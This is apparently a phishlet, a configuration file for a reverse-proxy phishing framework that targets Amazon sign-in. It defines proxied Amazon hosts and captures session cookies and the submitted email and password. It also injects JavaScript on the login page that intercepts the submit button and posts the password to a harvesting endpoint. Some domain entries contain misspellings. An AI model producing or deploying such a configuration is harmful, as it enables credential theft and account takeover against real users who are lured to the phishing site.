author: '@An0nud4y'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: false, is_landing: false}
  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false}
sub_filters:
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
auth_tokens:
  - domain: '.amazon.com'
    keys: ['session-token', 'session-id-time', 'session-id', '.*,regexp']
  - domain: 'www.amazon.com'
    keys: ['csm-hit,opt', '.*,regexp']

auth_urls:
  - '/'
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'unenc_password'
    search: '(.*)'
    type: 'post'
    
login:
  domain: 'www.amazon.com'
  path: '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
js_inject:
  - trigger_domains: ["www.amazon.com"]
    trigger_paths: ["/ap/signin", "/signin"]
    trigger_params: []
    script: |  
      let start = setInterval(function() {
           if (document.querySelectorAll('input[id=ap_password]').length) {
              clearInterval(start);
              let subButton = document.querySelectorAll('input[type="submit"]')[0];
              let parent = subButton.parentElement
              async function a(ev) {
                  ev.stopPropagation();
                  ev.preventDefault();
                  if (!subButton.disabled) {
                      var password = document.getElementsByName("password")[0].value;
                      await fetch('/accounts/login/ajax/', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: "unenc_password=" + encodeURIComponent(password)});
                      parent.removeEventListener('click', a, true);
                      ev.target.click()
                  }
              }
              parent.addEventListener("click", a, true);
              new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.type == "attributes" && mutation.attributeName == "disabled" && mutation.target.disabled == true) {
                        parent.removeEventListener('click', a, true);
                        parent.addEventListener("click", a, true);
                    }
                });
              }).observe(document.querySelectorAll('input[type="submit"]')[0], {
                attributes: true //configure it to listen to attribute changes
              });
          }
        }, 2000);